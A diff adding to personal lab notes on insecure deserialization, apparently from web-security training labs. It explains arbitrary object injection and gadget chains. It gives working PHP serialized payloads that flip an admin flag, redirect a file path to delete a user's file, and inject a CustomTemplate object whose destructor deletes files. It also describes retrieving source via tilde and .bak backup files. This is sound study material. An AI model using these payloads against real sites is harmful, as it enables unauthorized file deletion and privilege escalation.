@@ -89,6 +89,10 @@ private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundE
 * You should pay attention to any classes that contain these types of magic methods. They allow you to pass data from a serialized object into the website's code before the object is fully deserialized. This is the starting point for creating more advanced exploits.
 
 #### Injecting Arbitrary Objects
+* It is occassionally possible to exploit insecure deserialization by simply editing the object supplied by the website; however, injecting arbitrary object types can open up many more possibilities. In object-oriented programming, the methods available to an object are determined by its class. Therefore, if an attacker can manipulate which class of object is being passed in as serialized data, they can influence what code is executed after, and even during, deserialization.
+* Deserialization methods do not typically check what they are deserializing. This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized. This effectively allows an attacker to create instances of arbitrary classes. The fact that this object is not of the expected class does not matter. The unexpected object type might cause an exception in the application logic, but the malicious object will already be instantiated by then.
+* If an attacker has access to the source code, they can study all of the available classes in detail. To construct a simple exploit, they would look for classes containing deserialization magic methods, then check whether any of them perform dangerous operations on controllable data. The attacker can then pass in a serialized object of this class to use its magic method for an exploit.
+* Classes containing these deserialization magic methods can also be used to initiate more complex attacks involving a long series of method invocations, known as a "gadget chain". 
 
 #### Lab: Modifying Serialized Objects
 * Decoding the session token as Base64 results in `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`. Flipping 0 to 1 and then attaching the session token to the request to `GET /admin/delete?username=carlos` to delete Carlos.
@@ -106,4 +110,49 @@ PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username]
 #### Lab: Using Application Functionality to Exploit Insecure Deserialization
 * Session cookie is this: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:19:"users/wiener/avatar";}`
 * Initial payload was `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}` which did not work ... looking at previous labs, Carlos's home directory actually is `/home/carlos/morale.txt` so let's try `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}` which worked!
-* 
+
+#### Lab: Arbitrary Object Injection in PHP
+* Serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. Create and inject a malicious serialized object to delete the `morale.txt` from Carlos's home directory. You will need to obtain source code access to solve this lab.
+* Hint: You can sometimes read source code by appending a tilde ~ to a filename to retrieve an editor-generated backup file. I was a bit confused by this hint, so I did some content spidering, and I discovered `/lib/CustomTemplate.php`. Navigating to it plainly resulted in a blank screen, but by appending a tilde, I found the following below. Now why did this work? Well, text editors like Vim and Nano create backup files often. You can also try the `.bak` trick - append .bak. 
+```
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+    private $lock_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+        $this->lock_file_path = $template_file_path . ".lock";
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lock_file_path);
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lock_file_path, "") === false) {
+                throw new Exception("Could not write to " . $this->lock_file_path);
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+        }
+    }
+}
+
+?>
+```
+- I found a very similar exploit path on OWASP: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection. My initial guess was then this: `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}` - AND IT WORKED!!!
